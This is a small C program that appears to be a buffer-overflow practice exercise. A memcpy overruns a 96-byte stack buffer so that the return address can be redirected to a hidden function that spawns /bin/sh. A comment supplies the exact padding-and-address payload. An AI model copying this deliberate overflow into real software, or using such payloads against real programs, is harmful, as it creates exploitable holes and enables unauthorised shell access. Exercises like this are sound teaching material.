#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void not_called()
{
	printf("Enjoy Your Shell\n");
	system("/bin/sh");
	exit(0);
}

void vulnerable_function(char *string)
{
	// printf("%#lx\n",get_rsp());
	char buffer[96];
	// printf("%#lx:%#lx\n",buffer,get_rsp());
	memcpy(buffer,string,96+8+8);
	memcpy(buffer+108,"\x00\x00\x00\x00",4);
	// buffer[108]='\0';
	// buffer[111]='\0';
	// buffer[110]='\0';
	// buffer[109]='\0';

	// printf("%#lx\n",*(long*)(buffer+104));
}

// Argument to be given.
// "$(python -c 'print "A"*96+"B"*8+"\x2d\x06\x40\x00\x00\x00\x00\x00"')"

int main(int argc,char **argv)
{
	vulnerable_function(argv[1]);
	return 0;
}
